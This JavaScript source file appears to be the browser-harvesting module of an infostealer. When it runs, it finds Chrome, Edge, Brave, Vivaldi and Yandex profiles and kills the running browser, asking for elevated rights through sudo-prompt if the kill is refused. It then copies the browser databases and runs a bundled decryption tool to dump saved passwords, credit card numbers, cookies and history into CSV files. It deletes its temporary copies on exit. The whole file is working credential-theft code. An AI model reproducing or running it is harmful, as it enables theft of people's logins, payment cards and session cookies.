const { existsSync, copyFileSync, mkdirSync, rmSync } = require('fs');
const { join, sep, resolve } = require('path');
const { randomFileCreator } = require('../util/dir');
const psList = () => import('ps-list').then(({ default: psList }) => psList());
const sudo = require('sudo-prompt');
const { execSync } = require('child_process');
const { tempFolder } = require('../index');
const { addDoubleQuotes } = require('../util/string');
const { sleep } = require('../util/general');
const { paths: { localAppData } } = require('../util/variables');

const browsers = [
  ['',       ['Vivaldi']],
  ['chrome', ['Google', 'Chrome SxS']],
  ['chrome', ['Google', 'Chrome']],
  ['msedge', ['Microsoft', 'Edge']],
  ['',       ['Yandex', 'YandexBrowser']],
  ['',       ['BraveSoftware', 'Brave-Browser']],
];

const filesToDelete = [];
const toolPath = addDoubleQuotes(join(__dirname, '..', 'util', 'decrypt-key', 'decrypt_key.exe'));
/**
 * @param {string} name
 * @param {string} path
 * @param {string} use
 * @param {string} filename
 * @param {(dbFile: string, csvFile: string) => void} dbData
 * @private
 */
const _ = (name, path, use, filename, dbData) => {
  path += join(sep, 'Default', use);
  if (!existsSync(path)) return;

  if (!existsSync(join(tempFolder, 'Browsers', name))) mkdirSync(join(tempFolder, 'Browsers', name));
  const file = join(tempFolder, 'Browsers', name, `${filename}.csv`);
  const dbFile = randomFileCreator();
  filesToDelete.push(dbFile);
  copyFileSync(path, dbFile);

  dbData(dbFile, file);
};

this.passwords = (name, path) => {
  return _(name, path, 'Login Data', 'Logins', (dbFile, csvFile) => execSync(
    [
      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT origin_url, username_value, password_value FROM logins"',
      `--csv-file "${csvFile}"`, '--rows "url,username,password"', '--decrypt-row 2'
    ].join(' ')
  ));
};

this.history = (name, path) => {
  return _(name, path, 'History', 'History', (dbFile, csvFile) => execSync(
    [
      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT url, title, visit_count, typed_count FROM urls"',
      `--csv-file "${csvFile}"`, '--rows "url,title,visit count,typed count"'
    ].join(' ')
  ));
};

this.creditCards = (name, path) => {
  return _(name, path, 'Web Data', 'Credit Cards', (dbFile, csvFile) => execSync(
    [
      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
      '--sql "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"',
      `--csv-file "${csvFile}"`, '--rows "name on card,expiration month,expiration year,card number"', '--decrypt-row 3'
    ].join(' ')
  ));
};

this.cookies = (name, path) => {
  return _(name, path, join('Network', 'Cookies'), 'Cookies', (dbFile, csvFile) => execSync(
    [
      toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
      '--sql "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, has_expires, is_persistent, samesite, source_port FROM cookies"',
      `--csv-file "${csvFile}"`, '--rows "host,name,value,path,is secure,is httponly,has expires,is persistent,samesite,port"',
      '--decrypt-row 2'
    ].join(' ')
  ));
};

const kill = (browser, onKilled) => {
  return psList().then(data => {
    const browserProcess = data.find(p => p.name === `${browser}.exe`);
    if (typeof browserProcess !== 'undefined' && 'name' in browserProcess) {
      process.on('uncaughtException', err => {
        // If we can't kill the browser without using administrator rights, we
        // need to use these to get access to the browser database files
        if (err.message === 'kill EPERM') {
          let cmd;
          // eslint-disable-next-line indent
               if (process.platform === 'win32') cmd = 'taskkill /f /im';
          else if (process.platform === 'linux') cmd = 'killall';
          else cmd = 'kill';
          sudo.exec(`${cmd} ${browserProcess?.name}`, {
            name: require('../config').name
          }, (err) => {
            if (err) return;
            onKilled();
          });
        }
      });
      process.kill(browserProcess.pid);
      onKilled();
    } else {
      // Process does not exist, we don't need to kill it (as it doesn't exist)
      // We just make show the UAC because if it is shown only if the browser is
      // not killed, it will be weird to the user
      // sudo.exec('echo hello', {
      //   name: require('../../config').name
      // }, (err) => {
      //   if (err) return;
      //   onKilled();
      // });
      onKilled();
    }
  });
};

if (!existsSync(join(tempFolder, 'Browsers'))) mkdirSync(join(tempFolder, 'Browsers'));
browsers.forEach((browser) => {
  const path = resolve(localAppData, browser[1].join(sep), 'User Data');
  // Browser data exists
  if (existsSync(path)) {
    // Kill browser process
    kill(browser[0], () => {
      ['passwords', 'history', 'creditCards', 'cookies']
        .forEach(fn => this[fn](browser[1].join(' '), path));
    });
  }
});

process.on('exit', () => {
  sleep(1000).then(() => filesToDelete.forEach(file => existsSync(file) && rmSync(file)));
});
